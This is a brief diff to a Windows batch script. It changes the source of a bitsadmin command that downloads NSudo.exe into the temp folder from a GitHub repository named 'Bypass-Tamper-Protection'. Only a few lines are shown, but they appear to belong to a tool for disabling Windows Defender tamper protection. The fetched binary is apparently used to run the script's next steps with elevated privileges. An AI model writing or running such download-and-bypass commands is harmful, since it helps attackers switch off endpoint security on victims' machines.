@@ -32,7 +32,7 @@ color 0a
 
 cd  %temp%
 
-bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
+bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/hackwithsumit/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
 set pop=%systemroot%
 
